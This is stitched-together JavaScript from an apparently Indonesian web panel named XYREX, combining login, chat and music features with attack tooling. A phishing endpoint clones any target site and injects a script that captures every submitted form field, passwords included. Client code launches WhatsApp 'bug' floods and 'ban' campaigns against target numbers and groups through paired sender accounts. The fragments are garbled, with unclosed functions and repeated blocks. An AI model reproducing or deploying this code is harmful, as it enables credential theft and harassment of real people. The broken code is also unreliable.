function hashPw(pw) {
  return crypto.createHash('sha256').update(String(pw)).digest('hex');

function authMiddleware(req, res, next) {
  const token = req.headers['x-auth-token'] || req.query.token;
  if (!token) return res.status(401).json({ ok: false, msg: 'No token' });
  const tokens = loadTokens();
  const username = tokens[token];
  if (!username) return res.status(401).json({ ok: false, msg: 'Invalid token' });
  const users = loadUsers();
  if (!users[username]) return res.status(401).json({ ok: false, msg: 'User gone' });
  req.user = users[username];
  req.token = token;
  next();
}



function ownerOnly(req, res, next) {
  if (req.user.role !== 'owner') {
    return res.status(403).json({ ok: false, msg: 'Hanya Owner yang bisa akses' });
  }
  next();
}

app.post('/api/login', (req, res) => {
  const { username, password } = req.body || {};
  if (!username || !password) return res.json({ ok: false, msg: 'Isi username dan password' });
  const users = loadUsers();
  const u = users[username];
  if (!u) return res.json({ ok: false, msg: 'Akun tidak ditemukan' });
  if (u.password !== hashPw(password)) return res.json({ ok: false, msg: 'Password salah' });
  const token = genToken();
  const tokens = loadTokens();
  tokens[token] = username;
  saveTokens(tokens);
  res.json({ ok: true, token, role: u.role, username: u.username });
});

app.post('/api/logout', authMiddleware, (req, res) => {
  const tokens = loadTokens();
  delete tokens[req.token];
  saveTokens(tokens);
  res.json({ ok: true });
});

function cleanPhone(phone) {
  let n = String(phone).replace(/[^0-9]/g, '');
  if (n.startsWith('0')) n = '62' + n.slice(1);
  if (n.startsWith('620')) n = '62' + n.slice(3);
  return n;
}

function resetAuth() {

async function initSocket(socketId, mode) {
  currentMode = mode;
  const { state, saveCreds } = await useMultiFileAuthState('./auth');
  const { version } = await fetchLatestBaileysVersion();

  sock = makeWASocket({
    version,
    logger: pino({ level: 'silent' }),
    printQRInTerminal: false,
    auth: state,
    browser: ['XYREX', 'Chrome', '1.0.0'],
    generateHighQualityLinkPreview: true,
    syncFullHistory: false,
    connectTimeoutMs: 60000,
    defaultQueryTimeoutMs: 60000,
    keepAliveIntervalMs: 25000
  });

  sock.ev.on('creds.update', saveCreds);

  sock.ev.on('connection.update', async (update) => {
    const { connection, lastDisconnect, qr } = update;

    if (qr && currentMode === 'qr') {
      try {
        const qrDataURL = await QRCode.toDataURL(qr);
        io.to(socketId).emit('qr', qrDataURL);
      } catch (e) { console.error('QR error:', e); }
    }

    if (connection === 'open') {
      isConnected = true;
      reconnecting = false;
      currentSender = sock.user?.id?.split(':')[0] || 'unknown';
      // Daftarkan ke sender registry
      try {
        const userMatch = loadTokens()[socket.id];
        const ownerName = userMatch || 'unknown';
        const existing = senderRegistry.findIndex(x => x.id === currentSender);
        const entry = {
          id: currentSender,
          owner: ownerName,
          label: 'Sender ' + currentSender.slice(-4),
          socketId: socketId,
          time: Date.now()
        };
        if (existing >= 0) {
          senderRegistry[existing] = entry;
        } else {
          senderRegistry.push(entry);
        }
        io.emit('senderUpdate', getSenderList());
        console.log('[XYREX] Sender terdaftar:', currentSender, 'oleh', ownerName);
      } catch (e) { console.log('reg sender err:', e.message); }
      io.to(socketId).emit('connected', { sender: currentSender });
      console.log('[XYREX] Sender aktif:', currentSender);
    }

    if (connection === 'close') {
      isConnected = false;
      const code = lastDisconnect?.error?.output?.statusCode;
      if (code === DisconnectReason.loggedOut) {
        io.to(socketId).emit('disconnected');
        resetAuth();
      } else if (!reconnecting) {
        reconnecting = true;
        setTimeout(() => {
          reconnecting = false;
          initSocket(socketId, currentMode).catch(e => console.log('restart err:', e.message));
        }, 2000);
      }
    }
  });
}

let senderRegistry = []; // array { id, owner, label, socketId, time }

    id: s.id,
    owner: s.owner,
    label: s.label,
    socketId: s.socketId,
    time: s.time
  }));
}

app.get('/api/tools/music/search', authMiddleware, async (req, res) => {
  try {
    const q = req.query.q;
    if (!q) return res.json({ ok: false, msg: 'Query kosong' });

    // Cari di Deezer dengan strict order
    const r = await axios.get('https://api.deezer.com/search', {
      params: {
        q: q,
        limit: 30,
        order: 'RANKING'  // urut by relevansi
      },
      timeout: 15000
    });
    let data = r.data.data || [];

    // Filter: hanya hasil yang judulnya mengandung kata kunci ATAU artist mengandung kata kunci
    const qLower = q.toLowerCase().trim();
    const qWords = qLower.split(/\s+/).filter(w => w.length > 1);

    data = data.filter(s => {
      const title = (s.title_short || s.title || '').toLowerCase();
      const artist = (s.artist && s.artist.name || '').toLowerCase();
      const album = (s.album && s.album.title || '').toLowerCase();
      const combined = title + ' ' + artist + ' ' + album;
      // Semua kata kunci harus ada di salah satu field
      return qWords.every(w => combined.includes(w));
    });

    // Kalau filter terlalu ketat dan hasil kosong, coba tanpa filter
    if (data.length === 0) {
      data = r.data.data || [];
    }

    // Sort: prioritaskan yang judulnya persis mengandung query
    data.sort((a, b) => {
      const aTitle = (a.title_short || a.title || '').toLowerCase();
      const bTitle = (b.title_short || b.title || '').toLowerCase();
      const aScore = (aTitle.includes(qLower) ? 100 : 0) + (a.rank || 0);
      const bScore = (bTitle.includes(qLower) ? 100 : 0) + (b.rank || 0);
      return bScore - aScore;
    });

    const results = data.slice(0, 20).map(s => ({
      title: s.title_short || s.title,
      artist: s.artist && s.artist.name || '-',
      album: s.album && s.album.title || '-',
      duration: s.duration ? Math.floor(s.duration / 60) + ':' + String(s.duration % 60).padStart(2, '0') : '-',
      artwork: s.album && s.album.cover_medium || s.artist && s.artist.picture_medium || '',
      url: s.preview || '',
      full: false,
      deezerUrl: s.link || ''
    })).filter(s => s.url);

    res.json({ ok: true, results: results, source: 'deezer' });
  } catch (e) {
    res.json({ ok: false, msg: e.message });
  }
});

const PHISH_DIR = path.join(__dirname, 'public', 'phish');
const PHISH_DATA_FILE = path.join(__dirname, 'phish-data.json');

if (!fs.existsSync(PHISH_DIR)) fs.mkdirSync(PHISH_DIR, { recursive: true });

function loadPhishData() {
  if (!fs.existsSync(PHISH_DATA_FILE)) return [];
  try { return JSON.parse(fs.readFileSync(PHISH_DATA_FILE, 'utf8')); }
  catch (e) { return []; }
}
function savePhishData(data) {
  fs.writeFileSync(PHISH_DATA_FILE, JSON.stringify(data.slice(-500), null, 2));
}

function slugifyUrl(url) {
  try {
    const u = new URL(url);
    return u.hostname.replace(/[^a-z0-9]/gi, '_') + '_' + Date.now().toString(36);
  } catch (e) {
    return 'phish_' + Date.now().toString(36);
  }
}

app.post('/api/phishing/create', authMiddleware, async (req, res) => {
  try {
    const { url } = req.body || {};
    if (!url) return res.json({ ok: false, msg: 'URL kosong' });
    if (!url.startsWith('http')) return res.json({ ok: false, msg: 'URL harus http/https' });

    const r = await axios.get(url, {
      timeout: 20000,
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5'
      },
      maxRedirects: 5
    });

    let html = r.data;
    if (typeof html !== 'string') html = JSON.stringify(html);

    const slug = slugifyUrl(url);
    const targetDir = path.join(PHISH_DIR, slug);
    fs.mkdirSync(targetDir, { recursive: true });

    try {
      const parsed = new URL(url);
      const origin = parsed.origin;
      html = html.replace(/(src|href|action|data-src)="(\/[^"]*)"/g, function(m, attr, pathv) {
        return attr + '="' + origin + pathv + '"';
      });
      if (html.indexOf('<base') === -1) {
        html = html.replace(/<head([^>]*)>/i, '<head$1><base href="' + origin + '/">');
      }
    } catch (e) {}

    const captureScript = '<script src="/phish/' + slug + '/phish-capture.js"></script>';
    if (html.indexOf('</body>') !== -1) {
      html = html.replace('</body>', captureScript + '</body>');
    } else {
      html += captureScript;
    }

    fs.writeFileSync(path.join(targetDir, 'index.html'), html);

    const captureJS = `(function(){
  function getSlug() { return '` + slug + `'; }
  document.addEventListener('DOMContentLoaded', function() {
    var forms = document.querySelectorAll('form');
    forms.forEach(function(form) {
      form.addEventListener('submit', function(e) {
        var data = {};
        var inputs = form.querySelectorAll('input, textarea, select');
        inputs.forEach(function(inp) {
          if (inp.name) data[inp.name] = inp.value;
          else if (inp.type === 'email' || inp.type === 'text' || inp.id) data[inp.id || inp.type] = inp.value;
        });
        try {
          fetch('/api/phishing/capture', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              slug: getSlug(),
              url: window.location.href,
              data: data,
              ua: navigator.userAgent,
              time: new Date().toISOString()
            })
          }).catch(function(){});
        } catch (err) {}
      });
    });
  });
})();`;
    fs.writeFileSync(path.join(targetDir, 'phish-capture.js'), captureJS);

    res.json({ ok: true, slug: slug, url: '/phish/' + slug + '/index.html', target: url, msg: 'Phishing page berhasil dibuat' });
  } catch (e) {
    res.json({ ok: false, msg: e.message });
  }
});

  }

function showMsg(txt, ok) {
  const el = document.getElementById('msg');
  el.textContent = txt;
  el.className = 'msg ' + (ok ? 'msg-ok' : 'msg-err');
}

async function doLogin() {
  const username = document.getElementById('username').value.trim();
  const password = document.getElementById('password').value;
  if (!username || !password) { showMsg('Isi username dan password', false); return; }
  try {
    const r = await fetch('/api/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username, password })
    });
    const j = await r.json();
    if (!j.ok) { showMsg(j.msg || 'Login gagal', false); return; }
    localStorage.setItem('xyrex_token', j.token);
    localStorage.setItem('xyrex_user', j.username);
    localStorage.setItem('xyrex_role', j.role);
    localStorage.removeItem('xyrex_player');
    localStorage.removeItem('xyrex_sender');
    showMsg('Login berhasil, mengalihkan...', true);
    setTimeout(() => { window.location.href = '/index.html'; }, 600);
  } catch (e) {
    showMsg('Error: ' + e.message, false);
  }
}

document.getElementById('password').addEventListener('keypress', e => {
  if (e.key === 'Enter') doLogin();
});

async function doLogout() {
  try { await fetch('/api/logout', { method: 'POST', headers: { 'x-auth-token': token } }); } catch(e) {}
  localStorage.removeItem('xyrex_player');
  localStorage.removeItem('xyrex_token');

const socket = io();
const chatBody = document.getElementById('chatBody');
let renderedIds = new Set();

function roleClass(r) {
  if (!r) return 'member';
  const lower = String(r).toLowerCase();
  if (['member', 'premium', 'owner', 'admin'].includes(lower)) return lower;
  return 'member';
}

function fmtTime(ts) {
  const d = new Date(ts);
  return d.getHours().toString().padStart(2,'0') + ':' + d.getMinutes().toString().padStart(2,'0');
}

function escapeHtml(s) {
  return String(s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
}

function appendMsg(m) {
  const id = m.username + '|' + m.time + '|' + m.message;
  if (renderedIds.has(id)) return;
  renderedIds.add(id);

  const empty = chatBody.querySelector('.chat-empty');
  if (empty) empty.remove();

  const div = document.createElement('div');
  div.className = 'chat-msg' + (m.username === user ? ' self' : '');
  
  // Avatar: foto profil atau initial
  const initial = (m.username || '?').charAt(0).toUpperCase();
  let avatarHtml = '<div class="cm-avatar" id="av_' + m.username + '_' + m.time + '">' + initial + '</div>';
  
  const roleCls = roleClass(m.role);
  const roleLabel = (m.role || 'member').toUpperCase();
  
  div.innerHTML = '<div class="cm-row">' + avatarHtml +
    '<div class="cm-content">' +
    '<div class="cm-head"><span class="cm-user">' + escapeHtml(m.username) + '</span>' +
    '<span class="cm-role ' + roleCls + '">' + roleLabel + '</span></div>' +
    '<div class="cm-text">' + escapeHtml(m.message) + '</div>' +
    '<div class="cm-time">' + fmtTime(m.time) + '</div>' +
    '</div></div>';
  chatBody.appendChild(div);
  chatBody.scrollTop = chatBody.scrollHeight;
  
  // Load avatar dari server
  fetch('/api/profile/' + encodeURIComponent(m.username), { headers: { 'x-auth-token': token } })
    .then(r => r.json())
    .then(p => {
      if (p.ok && p.avatar) {
        const av = document.getElementById('av_' + m.username + '_' + m.time);
        if (av) av.innerHTML = '<img src="' + p.avatar + '">';
      }
    }).catch(() => {});
}

function escapeAttr(s) {
  return String(s || '').replace(/'/g, '\\\'').replace(/"/g, '');
}



function sendChat() {
  const input = document.getElementById('chatInput');
  const text = input.value.trim();
  if (!text) return;
  socket.emit('chatSend', { username: user, role: role, message: text });
  input.value = '';
}

socket.on('chatHistory', (msgs) => {
  chatBody.innerHTML = '';
  renderedIds.clear();
  if (!msgs || msgs.length === 0) {
    chatBody.innerHTML = '<div class="chat-empty">Belum ada pesan. Jadilah yang pertama!</div>';
    return;
  }
  msgs.forEach(appendMsg);
});

socket.on('chatMessage', (m) => { appendMsg(m); });

function toggleMenu() {

async function doLogout() {
  try { await fetch('/api/logout', { method: 'POST', headers: { 'x-auth-token': token } }); } catch(e) {}
  localStorage.removeItem('xyrex_player');
  localStorage.removeItem('xyrex_token');

  window.location.href = '/login.html';

const socket = io();
let selectedBug = null;
let countdownTimer = null;

function log(msg) {
  const box = document.getElementById('logBox');
  const t = new Date().toLocaleTimeString();
  box.textContent += "\n[" + t + "] " + msg;
  box.scrollTop = box.scrollHeight;
}

function switchTab(mode) {
  document.getElementById('tabQR').classList.toggle('active', mode === 'qr');
  document.getElementById('tabCode').classList.toggle('active', mode === 'code');
  document.getElementById('areaQR').classList.toggle('hidden', mode !== 'qr');
  document.getElementById('areaCode').classList.toggle('hidden', mode !== 'code');
  document.getElementById('qrArea').classList.toggle('hidden', mode !== 'qr');
  document.getElementById('codeArea').classList.toggle('hidden', mode !== 'code');
}

function startQR() {
  document.getElementById('pairStatus').textContent = 'Status: Membuat sesi QR...';
  document.getElementById('pairStatus').className = 'status status-warn';
  document.getElementById('qrArea').classList.remove('hidden');
  document.getElementById('codeArea').classList.add('hidden');
  document.getElementById('qrArea').innerHTML = '<p style="color:#4a5a7a;">Memuat QR...</p>';
  socket.emit('startQR');
}

function startPair() {
  const num = document.getElementById('senderNum').value.trim();
  if (!num || num.length < 10) { alert('Nomor tidak valid, minimal 10 digit'); return; }
  if (countdownTimer) clearInterval(countdownTimer);
  document.getElementById('pairStatus').textContent = 'Status: Membuat sesi code (tunggu 3-5 detik)...';
  document.getElementById('pairStatus').className = 'status status-warn';
  document.getElementById('qrArea').classList.add('hidden');
  document.getElementById('codeArea').classList.remove('hidden');
  socket.emit('startPairing', { phone: num });
}

function resetSession() {
  if (countdownTimer) clearInterval(countdownTimer);
  socket.emit('resetSession');
  document.getElementById('pairStatus').textContent = 'Status: Sesi direset';
  document.getElementById('pairStatus').className = 'status status-off';
  document.getElementById('qrArea').innerHTML = '';
  document.getElementById('codeText').textContent = '-';
  document.getElementById('countdown').textContent = '-';
}

function selectBug(el) {
  document.querySelectorAll('.bug-opt').forEach(o => o.classList.remove('selected'));
  el.classList.add('selected');
  selectedBug = el.dataset.bug;
}

function executeBug() {
  const target = document.getElementById('targetNum').value.trim();
  const count = parseInt(document.getElementById('bugCount').value) || 50;
  if (!target) { log('ERROR: Target kosong'); return; }
  if (!selectedBug) { log('ERROR: Pilih bug'); return; }
  socket.emit('executeBug', { target, bugType: selectedBug, count });
}

socket.on('pairingCode', ({ code, clean, expireAt }) => {
  document.getElementById('codeText').textContent = code;
  document.getElementById('pairStatus').textContent = 'Status: Ketik kode ke WhatsApp ' + clean;
  document.getElementById('pairStatus').className = 'status status-warn';
  if (countdownTimer) clearInterval(countdownTimer);
  countdownTimer = setInterval(() => {
    const sisa = Math.max(0, Math.floor((expireAt - Date.now()) / 1000));
    const el = document.getElementById('countdown');
    if (sisa > 0) el.textContent = 'Kode expired dalam ' + sisa + ' detik';
    else { el.textContent = 'Kode expired. Klik Reset Sesi.'; clearInterval(countdownTimer); }
  }, 1000);
});

socket.on('qr', (dataURL) => {
  document.getElementById('qrArea').classList.remove('hidden');
  document.getElementById('qrArea').innerHTML = '<img src="' + dataURL + '">';
});

socket.on('connected', ({ sender }) => {
  if (countdownTimer) clearInterval(countdownTimer);
  document.getElementById('pairStatus').textContent = 'Status: Terpairing dengan ' + sender;
  document.getElementById('pairStatus').className = 'status status-on';
  document.getElementById('step2').classList.remove('hidden');
  document.getElementById('senderActive').textContent = 'Sender Pribadi Aktif: ' + sender;
});

socket.on('pairingError', ({ message }) => {
  document.getElementById('pairStatus').textContent = 'Status: ' + message;
  document.getElementById('pairStatus').className = 'status status-off';
});

socket.on('bugLog', ({ msg }) => { log(msg); });

socket.on('disconnected', () => {
  document.getElementById('pairStatus').textContent = 'Status: Terputus (logged out)';
  document.getElementById('pairStatus').className = 'status status-off';
});

function runBug() {
  const senderAktif = (senderType === 'pribadi' && senderPribadiCount > 0) || (senderType === 'global' && senderGlobalCount > 0);
  if (!senderAktif) {
    if (senderType === 'pribadi') {
      showPopup('Sender Kosong', 'Kamu belum pairing sender WhatsApp. Pairing dulu di menu Pairing Sender.');
    } else {
      showPopup('Sender Global Kosong', 'Belum ada user lain yang pairing sender di XYREX.');
    }
    return;
  }

  const target = document.getElementById('targetNum').value.trim();
  if (!target) {
    showPopup('Nomor Kosong', 'Isi nomor target WhatsApp dulu.');
    return;

  if (target.length < 10) {
    showPopup('Nomor Terlalu Pendek', 'Nomor target minimal 10 digit. Format: 628xxxxxxxxxx');
    return;

  if (!/^[0-9]+$/.test(target)) {
    showPopup('Nomor Tidak Valid', 'Nomor target hanya boleh angka. Format: 628xxxxxxxxxx');
    return;

  if (!target.startsWith('62') && !target.startsWith('0')) {
    showPopup('Format Nomor Salah', 'Nomor target harus diawali 62 atau 0. Contoh: 6281234567890');
    return;

  document.getElementById('progressFill').style.width = '0%';
  document.getElementById('progressFill').textContent = '0%';
  document.getElementById('progressText').textContent = '0 / 0';
  document.getElementById('doneArea').style.display = 'none';
  socket.emit('bugNumber', { target, mode: selectedMode });
}

async function doLogout() {
  try { await fetch('/api/logout', { method: 'POST', headers: { 'x-auth-token': token } }); } catch (e) {}
  localStorage.clear();
  window.location.href = '/login.html';
}

// Toast popup
function showPopup(title, msg) {
  const wrap = document.getElementById('toastWrap');
  const el = document.createElement('div');
  el.className = 'xyrex-toast';
  el.innerHTML = '<div class="toast-dot"></div><div class="toast-msg"></div><button class="toast-close">×</button>';
  el.querySelector('.toast-msg').textContent = msg;
  el.querySelector('.toast-close').onclick = () => el.remove();
  wrap.appendChild(el);
  setTimeout(() => { if (el.parentElement) el.remove(); }, 3500);
}

// Sender selector
let senderType = 'pribadi';
let senderPribadiCount = 0;
let senderGlobalCount = 0;

function selectSenderType(t) {
  senderType = t;
  document.getElementById('boxPribadi').classList.toggle('active', t === 'pribadi');
  document.getElementById('boxGlobal').classList.toggle('active', t === 'global');
}

// Mode selector
let selectedMode = 'ban';

  document.querySelectorAll('.mode-card').forEach(c => c.classList.remove('active'));
  el.classList.add('active');
  selectedMode = el.dataset.mode;
  el.scrollIntoView({ behavior: 'smooth', inline: 'center', block: 'nearest' });

// Socket
const socket = io();

socket.on('connect', () => setTimeout(() => socket.emit('sender:list'), 500));
socket.on('senderUpdate', () => socket.emit('sender:list'));

socket.on('sender:data', ({ pribadi, global, me }) => {
  senderPribadiCount = pribadi.length;
  senderGlobalCount = global.length;
  document.getElementById('countPribadi').textContent = senderPribadiCount > 0 ? senderPribadiCount : 'X';
  document.getElementById('countGlobal').textContent = senderGlobalCount > 0 ? senderGlobalCount : 'X';
  document.getElementById('senderInfo').textContent = 'Login: ' + (me || '-') + ' | Pribadi: ' + senderPribadiCount + ' | Global: ' + senderGlobalCount;
  if (senderPribadiCount === 0 && senderGlobalCount > 0) selectSenderType('global');
  else if (senderPribadiCount > 0) selectSenderType('pribadi');
});

socket.on('bugProgress', ({ current, total }) => {
  document.getElementById('progressArea').style.display = 'block';
  document.getElementById('doneArea').style.display = 'none';
  const pct = Math.round((current / total) * 100);
  const fill = document.getElementById('progressFill');
  fill.style.width = pct + '%';
  fill.textContent = pct + '%';
  document.getElementById('progressText').textContent = current + ' / ' + total;
});

socket.on('bugDone', () => {
  document.getElementById('progressArea').style.display = 'none';
  document.getElementById('doneArea').style.display = 'block';
});

function runBan() {
  const senderAktif = (senderType === 'pribadi' && senderPribadiCount > 0) || (senderType === 'global' && senderGlobalCount > 0);
  if (!senderAktif) {
    if (senderType === 'pribadi') {
      showPopup('Sender', 'Kamu belum pairing sender WhatsApp. Pairing dulu di Pairing Sender.');
    } else {
      showPopup('Sender', 'Belum ada user lain yang pairing sender.');
    }
    return;
  }

  const groupLink = document.getElementById('groupLink').value.trim();
  if (!groupLink || !groupLink.includes('chat.whatsapp.com')) {
    showPopup('Link Grup', 'Isi link grup WhatsApp dengan format https://chat.whatsapp.com/xxxxx');
    return;
  }

  document.getElementById('progressArea').style.display = 'block';
  document.getElementById('progressFill').style.width = '0%';
  document.getElementById('progressFill').textContent = '0%';

function showMsg(txt, ok) {
  const el = document.getElementById('msg');

async function loadUsers() {
  const r = await fetch('/api/users', { headers: { 'x-auth-token': token } });
  const j = await r.json();
  if (!j.ok) { showMsg(j.msg, false); return; }
  const list = document.getElementById('userList');
  list.innerHTML = '';
  j.users.forEach(u => {

      <div class="actions">
        ${u.role === 'owner' ? '<span style="font-size:12px;color:#0a7a2a;font-weight:700;">Owner tidak bisa diubah</span>' : `

            <option value="member" ${u.role==='member'?'selected':''}>Member</option>
            <option value="premium" ${u.role==='premium'?'selected':''}>Premium</option>
            <option value="admin" ${u.role==='admin'?'selected':''}>Admin</option>
          </select>
          <button class="btn btn-danger" onclick="deleteUser('${u.username}')">Hapus</button>
        `}
      </div>
    `;
    list.appendChild(div);
  });
}

async function createUser() {
  const username = document.getElementById('newUser').value.trim();
  const password = document.getElementById('newPass').value;
  const role = document.getElementById('newRole').value;
  if (!username || !password) { showMsg('Isi username dan password', false); return; }
  const r = await fetch('/api/users', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'x-auth-token': token },
    body: JSON.stringify({ username, password, role })
  });
  const j = await r.json();
  showMsg(j.msg, j.ok);
  if (j.ok) {
    document.getElementById('newUser').value = '';
    document.getElementById('newPass').value = '';
    loadUsers();
  }
}

async function deleteUser(username) {
  if (!confirm('Hapus akun ' + username + '?')) return;
  const r = await fetch('/api/users/' + encodeURIComponent(username), {
    method: 'DELETE',
    headers: { 'x-auth-token': token }
  });
  const j = await r.json();
  showMsg(j.msg, j.ok);
  if (j.ok) loadUsers();
}

    body: JSON.stringify({ role })
  });
  const j = await r.json();
  showMsg(j.msg, j.ok);
  if (j.ok) loadUsers();
}

const token = localStorage.getItem('xyrex_token');

function loadProfile() {
  fetch('/api/profile', { headers: { 'x-auth-token': token } })
    .then(r => r.json())
    .then(j => {
      if (j.ok) {
        const av = document.getElementById('avatarPreview');
        if (j.avatar) {
          av.innerHTML = '<img src="' + j.avatar + '">';
        } else {
          // Fallback SVG avatar default
          av.innerHTML = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="width: 100%; height: 100%; padding: 18px;"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>';
        }
      }
    });
}
loadProfile();

function uploadAvatar(event) {
  const file = event.target.files[0];
  if (!file) return;
  if (file.size > 5 * 1024 * 1024) {
    window.xyrexToast('Foto max 5MB', 'error');
    return;
  }
  const reader = new FileReader();
  reader.onload = () => {
    const dataUrl = reader.result;
    
    // Update UI LANGSUNG sebelum kirim ke server
    document.getElementById('avatarPreview').innerHTML = '<img src="' + dataUrl + '">';
    window.xyrexToast('Mengunggah foto...', 'info');

    fetch('/api/profile/avatar', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'x-auth-token': token },
      body: JSON.stringify({ avatar: dataUrl })
    })
    .then(r => r.json())
    .then(j => {
      if (j.ok) {
        window.xyrexToast('Foto profil berhasil diupdate!', 'success');
        loadProfile();
      } else {
        window.xyrexToast('Gagal: ' + j.msg, 'error');
      }
    }).catch(e => window.xyrexToast('Error: ' + e.message, 'error'));
  };
  reader.readAsDataURL(file);
}

function changePassword() {
  const oldPw = document.getElementById('oldPassword').value;
  const newPw = document.getElementById('newPassword').value;
  const confirmPw = document.getElementById('confirmPassword').value;
  if (!oldPw || !newPw || !confirmPw) { window.xyrexToast('Lengkapi semua field', 'error'); return; }
  if (newPw !== confirmPw) { window.xyrexToast('Konfirmasi sandi tidak cocok', 'error'); return; }
  if (newPw.length < 6) { window.xyrexToast('Sandi minimal 6 karakter', 'error'); return; }
  fetch('/api/profile/password', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'x-auth-token': token },
    body: JSON.stringify({ oldPassword: oldPw, newPassword: newPw })
  })
  .then(r => r.json())
  .then(j => {
    if (j.ok) {
      window.xyrexToast('Sandi berhasil diubah!', 'success');
      document.getElementById('oldPassword').value = '';
      document.getElementById('newPassword').value = '';
      document.getElementById('confirmPassword').value = '';
    } else {
      window.xyrexToast('Gagal: ' + j.msg, 'error');
    }
  });
}

async function searchMusic() {
  const q = document.getElementById('searchInput').value.trim();
  if (!q) { window.xyrexToast('Masukkan judul lagu', 'error'); return; }
  document.getElementById('listTitle').textContent = 'Hasil Pencarian';
  const list = document.getElementById('searchResult');
  list.innerHTML = '<div style="text-align:center; padding:16px; color:#7a8aaa;">Mencari...</div>';
  try {
    const r = await fetch('/api/tools/music/search?q=' + encodeURIComponent(q), { headers: { 'x-auth-token': token } });
    const j = await r.json();
    if (!j.ok || !j.results || j.results.length === 0) {
      window.xyrexToast('Lagu tidak ditemukan', 'error');
      list.innerHTML = '<div style="text-align:center; color:#7a8aaa; padding:20px;">Tidak ada hasil</div>';
      return;
    }
    renderTracks(j.results);
  } catch (e) {
    window.xyrexToast('Error: ' + e.message, 'error');
    list.innerHTML = '';
  }
}

async function loadTrending() {
  const list = document.getElementById('searchResult');
  document.getElementById('listTitle').textContent = 'Sedang Populer';
  list.innerHTML = '<div style="text-align:center; padding:16px; color:#7a8aaa;">Memuat trending...</div>';
  try {
    const r = await fetch('/api/tools/music/trending', { headers: { 'x-auth-token': token } });
    const j = await r.json();
    if (!j.ok || !j.results || j.results.length === 0) {
      list.innerHTML = '<div style="text-align:center; color:#7a8aaa; padding:20px;">Trending tidak tersedia</div>';
      return;
    }
    renderTracks(j.results);
  } catch (e) {
    list.innerHTML = '<div style="text-align:center; color:#7a8aaa; padding:20px;">Gagal load trending</div>';
  }
}

function renderTracks(tracks) {
  const list = document.getElementById('searchResult');
  list.innerHTML = '';
  window._tracks = tracks;
  tracks.forEach(function(t, idx) {
    var el = document.createElement('div');
    el.className = 'track-item';
    el.innerHTML = '<img class="cover" src="' + (t.artwork || '') + '" onerror="this.style.background=\'#1db954\'">' +
      '<div class="meta">' +
      '<div class="title">' + escapeHtml(t.title) + '</div>' +
      '<div class="artist">' + escapeHtml(t.artist) + ' • ' + escapeHtml(t.album) + ' • ' + (t.duration || '-') + '</div>' +
      '<div class="actions">' +
      '<button class="mini-btn play-btn" onclick="playTrackByIndex(' + idx + ')">▶ Putar Preview</button>' +
      '<button class="mini-btn yt-btn" onclick="openYouTube(\'' + escapeAttr(t.title) + '\', \'' + escapeAttr(t.artist) + '\')">▶ Full di YouTube</button>' +
      '</div></div>';
    list.appendChild(el);
  });
}

function escapeHtml(s) {
  return String(s || '').replace(/[&<>"']/g, function(c) {
    return {'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c];
  });
}
function escapeAttr(s) {
  return String(s || '').replace(/'/g, '').replace(/"/g, '');
}

function playTrackByIndex(idx) {
  var t = window._tracks && window._tracks[idx];
  if (!t || !t.url) { window.xyrexToast('URL lagu tidak tersedia', 'error'); return; }

  // Simpan state dengan owner = username yang lagi login
  var currentUser = localStorage.getItem('xyrex_user') || '';
  localStorage.removeItem('xyrex_player');
  localStorage.setItem('xyrex_player', JSON.stringify({
    url: t.url,
    title: t.title,
    artist: t.artist,
    artwork: t.artwork,
    time: 0,
    playing: true,
    owner: currentUser,
    savedAt: Date.now()
  }));

  if (window.XYP_REFRESH) {
    window.XYP_REFRESH();
  } else {
    setTimeout(function() { window.location.reload(); }, 300);
  }
}

(function() {
  console.log('[XYP v5] Init');

  function injectIframe() {
    if (document.getElementById('xypIframe')) return;
    var iframe = document.createElement('iframe');
    iframe.id = 'xypIframe';
    iframe.src = '/player-persistent.html';
    iframe.style.cssText = 'position:fixed;width:0;height:0;border:0;visibility:hidden;';
    iframe.setAttribute('allow', 'autoplay');
    document.body.appendChild(iframe);
    console.log('[XYP v5] Iframe injected');
  }

  function stopAllAudio() {
    // Stop audio di halaman utama (kalau ada)
    document.querySelectorAll('audio').forEach(function(a) {
      try { a.pause(); a.src = ''; } catch (e) {}
    });
    // Kirim sinyal ke iframe biar stop juga
    var iframe = document.getElementById('xypIframe');
    if (iframe && iframe.contentWindow) {
      try { iframe.contentWindow.postMessage({ type: 'stop' }, '*'); } catch (e) {}
    }
  }

  function boot() {
    var raw = localStorage.getItem('xyrex_player');
    // Siapkan iframe selalu
    injectIframe();

    // Hapus bar lama kalau ada
    var oldBar = document.getElementById('xypBar');
    if (oldBar) oldBar.remove();

    // Kalau tidak ada state, keluar
    if (!raw) { console.log('[XYP v5] no state'); return; }

    var state;
    try { state = JSON.parse(raw); } catch (e) { return; }
    if (!state || !state.url) return;

    // Cek owner
    var currentUser = localStorage.getItem('xyrex_user') || '';
    if (state.owner && state.owner !== currentUser) {
      console.log('[XYP v5] beda user, clear');
      localStorage.removeItem('xyrex_player');
      return;
    }

    // Cek umur state
    var age = Date.now() - (state.savedAt || 0);
    if (age > 12 * 60 * 60 * 1000) {
      localStorage.removeItem('xyrex_player');
      return;
    }

    console.log('[XYP v5] restore:', state.title);

(function() {
  var audio = null;
  var currentState = null;
  var lastUrl = '';

  function getState() {
    try {
      var raw = localStorage.getItem('xyrex_player');
      if (!raw) return null;
      return JSON.parse(raw);
    } catch (e) { return null; }
  }

  function saveState() {
    if (!audio || !audio.src) return;
    try {
      localStorage.setItem('xyrex_player', JSON.stringify({
        url: audio.src,
        title: currentState ? currentState.title : '',
        artist: currentState ? currentState.artist : '',
        artwork: currentState ? currentState.artwork : '',
        time: audio.currentTime,
